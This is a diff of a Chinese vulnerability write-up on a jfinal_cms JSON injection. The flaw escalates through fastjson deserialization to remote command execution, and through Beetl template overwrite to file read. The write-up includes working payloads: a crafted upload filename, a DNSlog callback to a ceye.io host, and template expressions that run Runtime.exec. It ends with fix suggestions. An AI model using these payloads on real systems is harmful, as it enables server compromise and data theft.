@@ -2,13 +2,13 @@
 
 #### TL;DR
 
-`jfinal_cms`存在`json`注入漏洞，在大部分版本可以导致前台远程命令执行。
+`jfinal_cms`存在`json`注入漏洞，凭借较低版本的`fastjson`可以导致前台远程命令执行，其中`jfinal_cms`依赖的默认`fastjson`版本均满足远程命令执行条件。
 
-原因在于`com.baidu.ueditor.define.BaseState#toString`方法通过拼接的方式处理`Map`键值对。逃逸出恶意属性后可通过`parseObject`函数触发该漏洞。该漏洞存在于`v4.0.0~v.5.1.0`版本，可利用`dnslog`版本为`v4.5.0~v.5.1.0`，可`RCE`版本为`v4.5.0~v.5.1.0`，在最新版本`v5.1.0`可通过`common-io`链实现任意文件写入，通过覆盖模板文件可以实现任意文件读取以及任意命令执行。
+原因在于`com.baidu.ueditor.define.BaseState#toString`方法通过拼接的方式处理`Map`键值对。逃逸出恶意属性后可通过`parseObject`函数触发该漏洞。该漏洞存在于`v4.0.0~v.5.1.0`版本，可`RCE`版本为`v4.5.0~v.5.1.0`，在最新版本`v5.1.0`可通过`common-io`链实现任意文件写入，通过覆盖模板文件可以实现任意命令执行以及任意文件读取。
 
 #### versions affected
 
-`version affected`：`jfnal_cms v4.5.0~v5.1.0`
+影响版本：`jfnal_cms v4.5.0~v5.1.0`
 
 #### find gadget
 
@@ -17,11 +17,11 @@
 
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)
 
-向上寻找`usage`，`ActionEnter#invoke`方法调用了`state#toJSONString`,可以看到当`ActionMap`为`UPLOAD_FILE`（文件上传）操作时会触发 `Uploader#doExec`。
+寻找该函数的`usage`，最终发现可以利用的是`ActionEnter#invoke`方法调用了`state#toJSONString`,可以看到当`ActionMap`为`UPLOAD_FILE`（文件上传）操作时会触发 `Uploader#doExec`。
 
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)
 
-先看`Uploader#doExec`的逻辑，这里会根据是否`base64`调用不同类的`save`方法。当操作为`UPLOAD_FILE`时配置类`ConfigManager`的`isBase64`为`false`，所以`Uploader#doExec`触发`BinaryUploader#save`。
+先看`Uploader#doExec`的逻辑，这里会根据是否`base64`调用不同类的`save`方法。当操作为`UPLOAD_FILE`时配置类`ConfigManager`的`isBase64`为`false`。
 ```java
 		case ActionMap.UPLOAD_FILE:
 			conf.put("isBase64", "false");
@@ -31,10 +31,10 @@
 			savePath = this.jsonConfig.getString("filePathFormat");
 			break;
 ```
-
+所以当进行文件上传操作时`Uploader#doExec`将会触发`BinaryUploader#save`。
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)
 
-审计`BinaryUploader#save`函数，可以看到`originFileName`是由上传表单的`filename`控制的，值得注意的一点是程序（仅仅）校验了后缀名，这里令`filename`为`filename=flag","vulnerable":"hacked","a":".txt`即可绕过，最终把`originFileName`放进`Map`
+审计`BinaryUploader#save`函数，可以看到`originFileName`是由上传表单的`filename`控制的，值得注意的一点是程序校验了后缀名，这里令`filename`为`filename=flag","vulnerable":"hacked","a":".txt`即可绕过，最终把`originFileName`放进`Map`。
 
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)
 
@@ -43,7 +43,7 @@
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)
 
 
-继续向上寻找利用链，发现以上函数调用可以通过`/ueditor`路由触发，其中返回的`out`为恶意字符串，最终把`out`传给了`UeditorService#uploadHandle`。
+继续寻找利用链，发现以上分析的函数调用逻辑可以通过`/ueditor`路由触发，其中返回的`out`为恶意字符串，最终把`out`传给了`UeditorService#uploadHandle`。
 
 ![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868878079.png)
 
@@ -57,7 +57,7 @@
 
 ##### dnslog
 
-`json`的第一个属性`"state":"SUCCESS`"是不可控的，这里用到一个小`trick`，令`filename`为`flag",{"@type":"java.net.Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt`即可正常恢复`Java Bean`。
+`json`的第一个属性`"state":"STATUS_TEXT"`是不可控的，这里用到一个小`trick`，令`filename`为`filename=flag",{"@type":"java.net.Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt`即可正常恢复`Java Bean`。
 
 `DNS`测试在`v4.5.0`版本进行，运行测试脚本。
 
@@ -66,9 +66,9 @@
 
 ##### V4.5.0-V5.1.0——RCE
 
-经过测试发现`v4.5.0~v5.0.1`用的都是`fastjson 1.2.28`,使用缓存即可绕过，用`ldap`打个`fastjson`全版本通杀反序列化链子即可`RCE`。
+`jfinal_cms v4.5.0~v5.0.1`默认使用的是`fastjson 1.2.28`,使用缓存即可绕过，用`ldap`打个`fastjson`全版本通杀反序列化链子即可`RCE`。
 
-`RCE`测试在`v5.0.1`版本进行。
+远程命令执行测试在`v5.0.1`版本进行。
 
 运行`jndi`服务端。
 
@@ -80,7 +80,7 @@
 
 ##### V5.1.0——任意文件写入 to 任意文件读取
 
-`1.2.68`之前可以通过期望类绕过`autoType`，而该项目又刚好引入了`common-io2.7`，因此可以打一个任意文件写。
+`1.2.68`之前可以通过期望类绕过`autoType`，而该项目又刚好引入了`common-io 2.7`，因此可以打一个任意文件写。
 
 ```json
 {
@@ -166,7 +166,7 @@
 }
 ```
 
-本来想覆盖`jsp`文件的，因为翻`issue`看到有人是这么做的 [there](https://github.com/jflyfox/jfinal_cms/issues/58)。但是我本地测试发现没办法触发`login.jsp`（不知道是不是本地的问题），似乎都被`url-pattern：/*`拦截了，远程我没有进行测试，如果可以触发`login.jsp`倒也是个好办法。
+本来想覆盖`jsp`文件的，因为翻`issue`看到有人是这么做的 [there](https://github.com/jflyfox/jfinal_cms/issues/58)。但是我本地测试发现没办法触发`login.jsp`（不知道是不是本地的问题），似乎都被`url-pattern：/*`拦截了，远程我没有进行测试，如果可以触发`login.jsp`那将是个很好的办法。
 
 ```xml
 	<welcome-file-list>
@@ -188,15 +188,15 @@
 	</filter-mapping>
 ```
 
-该项目用到了`beetl`模版，自带的函数`printFile`支持文件读取，因此可以通过覆盖模版文件实现任意文件读取。运行利用脚本，覆盖`E:/jfinal_cms/src/main/webapp/template/includes/jquery.html`，由于`fj`禁用了目录穿越符`..`，因此貌似只能用绝对路径。
+该项目用到了`beetl`模版，自带的函数`printFile`支持文件读取，因此可以通过覆盖模版文件实现任意文件读取。运行利用脚本，覆盖`E:/jfinal_cms/src/main/webapp/template/includes/jquery.html`，由于`fj`禁用了目录穿越符`..`，似乎只能用绝对路径来进行写入。
 
-但是读文件`printFile`是可以通过目录穿越读到所有文件的，这里用`webapp/FLAG`文件作为示范。
+但是读文件`printFile`是可以通过目录穿越读到所有文件的，这里用`web.xml`文件作为示范。
 
-![1695020177538](http://114.67.236.137/pic/1695020177538.png)
+![1695262945189](http://114.67.236.137/pic/1695262945189.png)
 
-抓包访问首页，读取到了`FLAG`文件。
+访问首页，读取到了`web.xml`文件。
 
-![image-20230918150306193](http://114.67.236.137/pic/image-20230918150306193.png)
+![1695262869901](http://114.67.236.137/pic/1695262869901.png)
 
 ##### V5.1.0版本——任意文件写入 to 任意命令执行
 
@@ -204,9 +204,9 @@
 
 `${@Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"s='calc';java.lang.Runtime.getRuntime().exec(s);\")`
 
-但问题在于在用`common-io`链写文件的时候发现不能写入双引号。使用`beetl`的定界符引入变量可以解决双引号的问题，因为`js`可以用单引号。但是我发现引入了分号`;`后服务器会认为分号`;`是结束符。总之通过引入变量的方法是不行的。
+但问题在于在用`common-io`链写文件的时候发现不能写入双引号。使用`beetl`的定界符引入变量可以解决双引号的问题，因为`js`可以用单引号。但是我发现引入了分号`;`后服务器会认为分号`;`是结束符。总之通过引入变量的方法也是写不进去的。
 
-翻阅`beetl`文档，可知`parameter 读取用户提交的参数。如${parameter.userId} (仅仅2.2.7以上版本支持)`，因此这样就可以啦。
+翻阅`beetl`文档，可知`parameter 读取用户提交的参数。如${parameter.userId} (2.2.7以上版本均支持)`，因此使用如下`payload`就可以正常写入了。
 
 ```
 ${@Class.forName(parameter.a).newInstance().getEngineByName(parameter.b).eval(parameter.c)}
@@ -226,7 +226,7 @@ ${@Class.forName(parameter.a).newInstance().getEngineByName(parameter.b).eval(pa
 
 Squirt1e
 
-#### Fixed
+#### Fix Suggestion
 
 1. 在`com.baidu.ueditor.define.BaseState#toString`方法中处理`key value`时不要使用拼接的方式。
 2. 升级`fastjson`依赖至最新版。
